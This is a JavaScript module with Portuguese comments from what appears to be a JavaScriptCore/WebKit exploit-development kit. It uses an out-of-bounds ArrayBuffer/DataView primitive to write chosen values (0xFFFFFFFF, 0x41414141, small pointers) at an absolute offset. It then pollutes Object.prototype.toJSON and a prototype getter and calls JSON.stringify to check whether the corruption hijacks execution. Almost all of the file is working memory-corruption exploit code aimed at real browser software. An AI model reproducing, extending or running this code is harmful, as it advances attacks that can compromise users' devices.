// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs'; // CORRIGIDO: PAUSE_S3 adicionado
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForWriteVariation";
let getter_called_for_current_value = false;

class CheckpointObjectForWriteVariation {
    constructor(id) {
        this.id = `WriteVariationCheckpoint-${id}`;
    }
}

export function toJSON_TriggerWriteVariationGetter() {
    const FNAME_toJSON = "toJSON_TriggerWriteVariationGetter";
    if (this instanceof CheckpointObjectForWriteVariation) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeWriteVariationTest";
    logS3(`--- Iniciando Teste de Variação de Escrita OOB em 0x70 ---`, "test", FNAME_TEST);

    if (!JSC_OFFSETS.ArrayBufferContents /* Coloque aqui as validações completas de config.mjs se necessário */) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        return;
    }

    const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;

    const values_to_test = [
        { name: "AllFs_8byte", value: new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF), size: 8 },
        { name: "Zeros_8byte", value: new AdvancedInt64(0x0, 0x0), size: 8 },
        { name: "Pattern41_8byte", value: new AdvancedInt64(0x41414141, 0x41414141), size: 8 },
        { name: "SmallPtr1_8byte", value: new AdvancedInt64(0x1, 0x0), size: 8 },
        { name: "AllFs_4byte_low", value: 0xFFFFFFFF, size: 4 },
        { name: "Zeros_4byte_low", value: 0x0, size: 4 },
        { name: "Pattern41_4byte_low", value: 0x41414141, size: 4 },
        { name: "SmallNum1_4byte_low", value: 0x1, size: 4 }
    ];

    let overall_test_summary = [];

    for (const test_case of values_to_test) {
        getter_called_for_current_value = false;
        logS3(`TESTANDO VALOR: ${test_case.name} (Valor: ${test_case.value instanceof AdvancedInt64 ? test_case.value.toString(true) : toHex(test_case.value)}, Tamanho: ${test_case.size})`, "subtest", FNAME_TEST);

        let toJSONPollutionApplied = false;
        let getterPollutionApplied = false;
        let originalToJSONProtoDesc = null;
        let originalGetterDesc = null;
        const ppKey_val = 'toJSON';

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_dataview_real) {
                logS3("Falha ao inicializar OOB para este valor. Pulando.", "critical", FNAME_TEST);
                overall_test_summary.push({ value_name: test_case.name, getter_triggered: false, error: "OOB Init Fail" });
                continue;
            }

            logS3(`Realizando escrita OOB em ${toHex(corruption_trigger_offset_abs)} com valor ${test_case.value instanceof AdvancedInt64 ? test_case.value.toString(true) : toHex(test_case.value)} (Tamanho: ${test_case.size})`, "info", FNAME_TEST);
            oob_write_absolute(corruption_trigger_offset_abs, test_case.value, test_case.size);
            logS3(`Escrita OOB completada.`, "info", FNAME_TEST);

            const checkpoint_obj = new CheckpointObjectForWriteVariation(1);
            originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForWriteVariation.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

            Object.defineProperty(CheckpointObjectForWriteVariation.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
                get: function() {
                    getter_called_for_current_value = true;
                    const FNAME_GETTER = "WriteVariation_Getter";
                    logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO para valor: ${test_case.name}!`, "vuln", FNAME_GETTER);
                    return 0xBADF00D;
                },
                configurable: true
            });
            getterPollutionApplied = true;

            originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
            Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerWriteVariationGetter, writable: true, enumerable: false, configurable: true});
            toJSONPollutionApplied = true;

            logS3(`Chamando JSON.stringify(checkpoint_obj) para valor: ${test_case.name}...`, "info", FNAME_TEST);
            JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify completado para valor: ${test_case.name}. Getter foi chamado? ${getter_called_for_current_value}`, "info", FNAME_TEST);

        } catch (mainError) {
            logS3(`Erro principal durante teste com valor ${test_case.name}: ${mainError.message}`, "critical", FNAME_TEST);
            console.error(mainError);
            overall_test_summary.push({ value_name: test_case.name, getter_triggered: getter_called_for_current_value, error: String(mainError) });
        } finally {
            if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) {
                if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
                else delete Object.prototype[ppKey_val];
            }
            if (getterPollutionApplied && CheckpointObjectForWriteVariation.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
                if (originalGetterDesc) Object.defineProperty(CheckpointObjectForWriteVariation.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
                else delete CheckpointObjectForWriteVariation.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
            }
            clearOOBEnvironment();
        }
        overall_test_summary.push({ value_name: test_case.name, getter_triggered: getter_called_for_current_value, error: null });
        logS3(`--- Fim do teste para valor: ${test_case.name} ---`, "subtest", FNAME_TEST);
        // Linha que causava o erro:
        await PAUSE_S3(100); // PAUSE_S3 agora deve estar definido devido à importação corrigida
    }

    logS3("==== SUMÁRIO DO TESTE DE VARIAÇÃO DE ESCRITA OOB ====", "test", FNAME_TEST);
    for (const summary of overall_test_summary) {
        if (summary.error && summary.error !== "OOB Init Fail") { // Não logar erro duas vezes para falha de init
             logS3(`Valor: ${summary.value_name} -> Getter Acionado: ${summary.getter_triggered}, ERRO: ${summary.error}`, summary.getter_triggered ? "warn" : "error", FNAME_TEST);
        } else if (summary.error === "OOB Init Fail") {
             logS3(`Valor: ${summary.value_name} -> ERRO NA INICIALIZAÇÃO OOB`, "critical", FNAME_TEST);
        }
        else {
            logS3(`Valor: ${summary.value_name} -> Getter Acionado: ${summary.getter_triggered}`, summary.getter_triggered ? "vuln" : "good", FNAME_TEST);
        }
    }
    logS3(`--- Teste de Variação de Escrita OOB Concluído ---`, "test", FNAME_TEST);
}
